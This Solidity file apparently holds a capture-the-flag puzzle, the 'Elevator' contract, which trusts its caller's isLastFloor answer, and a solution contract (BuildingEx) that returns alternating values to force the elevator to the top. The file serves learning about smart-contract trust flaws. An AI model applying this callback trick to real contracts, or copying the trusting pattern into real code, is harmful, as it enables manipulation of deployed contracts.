// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract BuildingEx is Building {
  bool public top;

  function blah(address a) public {
    Elevator elevator = Elevator(a);
    elevator.goTo(1);
  }

  function isLastFloor(uint _a) public returns(bool) {
    bool ret = top;
    top = !top;
    return ret;
  }
}
